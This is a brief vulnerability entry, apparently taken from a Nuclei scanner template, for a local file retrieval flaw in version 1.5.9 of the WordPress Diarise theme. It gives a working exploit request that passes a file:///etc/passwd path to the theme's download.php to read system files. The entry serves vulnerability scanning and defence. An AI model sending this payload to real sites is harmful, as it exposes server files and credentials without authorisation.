# Vulnerability: WordPress Diarise 1.5.9 - Arbitrary File Retrieval
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`diarise-theme-lfi.yaml`)

## Description
WordPress Diarise theme version 1.5.9 suffers from a local file retrieval vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
```

